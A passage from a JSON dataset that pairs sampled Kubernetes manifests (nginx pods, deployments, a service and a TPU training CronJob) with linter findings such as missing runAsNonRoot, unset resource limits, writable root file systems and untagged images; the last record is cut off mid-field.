  },
  {
    "id": "2430",
    "manifest_path": "data/manifests/the_stack_sample/sample_0633.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: default-demo\nspec:\n  containers:\n  - name: default-demo-ctr\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"default-demo-ctr\" is not set to runAsNonRoot"
  },
  {
    "id": "2431",
    "manifest_path": "data/manifests/the_stack_sample/sample_0633.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: default-demo\nspec:\n  containers:\n  - name: default-demo-ctr\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"default-demo-ctr\" has cpu request 0"
  },
  {
    "id": "2432",
    "manifest_path": "data/manifests/the_stack_sample/sample_0633.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: default-demo\nspec:\n  containers:\n  - name: default-demo-ctr\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"default-demo-ctr\" has memory limit 0"
  },
  {
    "id": "2433",
    "manifest_path": "data/manifests/the_stack_sample/sample_0635.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: controller\n  namespace: maths\n  labels:\n    maths.tableflip.dev/release: devel\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: controller\n  template:\n    metadata:\n      labels:\n        app: controller\n        maths.tableflip.dev/release: devel\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchLabels:\n                  app: controller\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n      serviceAccountName: controller\n      containers:\n      - name: controller\n        image: ko://tableflip.dev/maths/cmd/controller\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 1000m\n            memory: 1000Mi\n        ports:\n        - name: metrics\n          containerPort: 9090\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: tableflip.dev/maths\n        securityContext:\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n          runAsNonRoot: true\n          capabilities:\n            drop:\n            - all\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"controller\" is using an invalid container image, \"ko://tableflip.dev/maths/cmd/controller\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2434",
    "manifest_path": "data/manifests/the_stack_sample/sample_0635.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: controller\n  namespace: maths\n  labels:\n    maths.tableflip.dev/release: devel\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: controller\n  template:\n    metadata:\n      labels:\n        app: controller\n        maths.tableflip.dev/release: devel\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchLabels:\n                  app: controller\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n      serviceAccountName: controller\n      containers:\n      - name: controller\n        image: ko://tableflip.dev/maths/cmd/controller\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 1000m\n            memory: 1000Mi\n        ports:\n        - name: metrics\n          containerPort: 9090\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: tableflip.dev/maths\n        securityContext:\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n          runAsNonRoot: true\n          capabilities:\n            drop:\n            - all\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"controller\" not found"
  },
  {
    "id": "2435",
    "manifest_path": "data/manifests/the_stack_sample/sample_0638.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: magazines\n  annotations:\n    sidecar.jaegertracing.io/inject: 'true'\n  labels:\n    app: swir\n    swir: magazines\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: swir\n  template:\n    metadata:\n      labels:\n        app: swir\n    spec:\n      containers:\n      - name: client\n        image: swir/swir-example-si-python-http-server:v0.3.2\n        env:\n        - name: ip\n          value: 127.0.0.1\n        - name: port\n          value: '8090'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"client\" does not have a read-only root file system"
  },
  {
    "id": "2436",
    "manifest_path": "data/manifests/the_stack_sample/sample_0638.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: magazines\n  annotations:\n    sidecar.jaegertracing.io/inject: 'true'\n  labels:\n    app: swir\n    swir: magazines\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: swir\n  template:\n    metadata:\n      labels:\n        app: swir\n    spec:\n      containers:\n      - name: client\n        image: swir/swir-example-si-python-http-server:v0.3.2\n        env:\n        - name: ip\n          value: 127.0.0.1\n        - name: port\n          value: '8090'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"client\" is not set to runAsNonRoot"
  },
  {
    "id": "2437",
    "manifest_path": "data/manifests/the_stack_sample/sample_0638.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: magazines\n  annotations:\n    sidecar.jaegertracing.io/inject: 'true'\n  labels:\n    app: swir\n    swir: magazines\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: swir\n  template:\n    metadata:\n      labels:\n        app: swir\n    spec:\n      containers:\n      - name: client\n        image: swir/swir-example-si-python-http-server:v0.3.2\n        env:\n        - name: ip\n          value: 127.0.0.1\n        - name: port\n          value: '8090'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"client\" has cpu request 0"
  },
  {
    "id": "2438",
    "manifest_path": "data/manifests/the_stack_sample/sample_0638.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: magazines\n  annotations:\n    sidecar.jaegertracing.io/inject: 'true'\n  labels:\n    app: swir\n    swir: magazines\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: swir\n  template:\n    metadata:\n      labels:\n        app: swir\n    spec:\n      containers:\n      - name: client\n        image: swir/swir-example-si-python-http-server:v0.3.2\n        env:\n        - name: ip\n          value: 127.0.0.1\n        - name: port\n          value: '8090'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"client\" has memory limit 0"
  },
  {
    "id": "2439",
    "manifest_path": "data/manifests/the_stack_sample/sample_0639.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: rbac-proxy\n  name: rbac-proxy\n  namespace: kontena-stats\nspec:\n  ports:\n  - name: http\n    port: 80\n    targetPort: http\n  selector:\n    app: rbac-proxy\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:rbac-proxy])"
  },
  {
    "id": "2440",
    "manifest_path": "data/manifests/the_stack_sample/sample_0644.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-maskrcnn-func-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - --model=mask_rcnn\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 40\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"postprocess\\\"\\\n            :\\n  \\\"pre_nms_num_boxes\\\": 1000\\n\\\"predict\\\":\\n  \\\"batch_size\\\": 40\\n\\\n            \\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\":\\n    \\\"path\\\": \\\"\\\n            $(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\n    \\\"prefix\\\"\\\n            : \\\"resnet50/\\\"\\n  \\\"iterations_per_loop\\\": 5000\\n  \\\"total_steps\\\": 1000\\n\\\n            \\  \\\"train_file_pattern\\\": \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --strategy_type=tpu\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/maskrcnn/func/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/maskrcnn/func/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-maskrcnn-func-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"monitor\" does not have a read-only root file system"
  },
  {
    "id": "2441",
    "manifest_path": "data/manifests/the_stack_sample/sample_0644.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-maskrcnn-func-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - --model=mask_rcnn\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 40\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"postprocess\\\"\\\n            :\\n  \\\"pre_nms_num_boxes\\\": 1000\\n\\\"predict\\\":\\n  \\\"batch_size\\\": 40\\n\\\n            \\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\":\\n    \\\"path\\\": \\\"\\\n            $(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\n    \\\"prefix\\\"\\\n            : \\\"resnet50/\\\"\\n  \\\"iterations_per_loop\\\": 5000\\n  \\\"total_steps\\\": 1000\\n\\\n            \\  \\\"train_file_pattern\\\": \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --strategy_type=tpu\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/maskrcnn/func/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/maskrcnn/func/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-maskrcnn-func-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"publisher\" does not have a read-only root file system"
  },
  {
    "id": "2442",
    "manifest_path": "data/manifests/the_stack_sample/sample_0644.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-maskrcnn-func-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - --model=mask_rcnn\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 40\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"postprocess\\\"\\\n            :\\n  \\\"pre_nms_num_boxes\\\": 1000\\n\\\"predict\\\":\\n  \\\"batch_size\\\": 40\\n\\\n            \\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\":\\n    \\\"path\\\": \\\"\\\n            $(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\n    \\\"prefix\\\"\\\n            : \\\"resnet50/\\\"\\n  \\\"iterations_per_loop\\\": 5000\\n  \\\"total_steps\\\": 1000\\n\\\n            \\  \\\"train_file_pattern\\\": \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --strategy_type=tpu\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/maskrcnn/func/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/maskrcnn/func/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-maskrcnn-func-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"train\" does not have a read-only root file system"
  },
  {
    "id": "2443",
    "manifest_path": "data/manifests/the_stack_sample/sample_0644.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-maskrcnn-func-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - --model=mask_rcnn\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 40\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"postprocess\\\"\\\n            :\\n  \\\"pre_nms_num_boxes\\\": 1000\\n\\\"predict\\\":\\n  \\\"batch_size\\\": 40\\n\\\n            \\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\":\\n    \\\"path\\\": \\\"\\\n            $(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\n    \\\"prefix\\\"\\\n            : \\\"resnet50/\\\"\\n  \\\"iterations_per_loop\\\": 5000\\n  \\\"total_steps\\\": 1000\\n\\\n            \\  \\\"train_file_pattern\\\": \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --strategy_type=tpu\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/maskrcnn/func/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/maskrcnn/func/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-maskrcnn-func-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"monitor\" is not set to runAsNonRoot"
  },
  {
    "id": "2444",
    "manifest_path": "data/manifests/the_stack_sample/sample_0644.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-maskrcnn-func-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - --model=mask_rcnn\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 40\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"postprocess\\\"\\\n            :\\n  \\\"pre_nms_num_boxes\\\": 1000\\n\\\"predict\\\":\\n  \\\"batch_size\\\": 40\\n\\\n            \\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\":\\n    \\\"path\\\": \\\"\\\n            $(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\n    \\\"prefix\\\"\\\n            : \\\"resnet50/\\\"\\n  \\\"iterations_per_loop\\\": 5000\\n  \\\"total_steps\\\": 1000\\n\\\n            \\  \\\"train_file_pattern\\\": \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --strategy_type=tpu\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/maskrcnn/func/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: 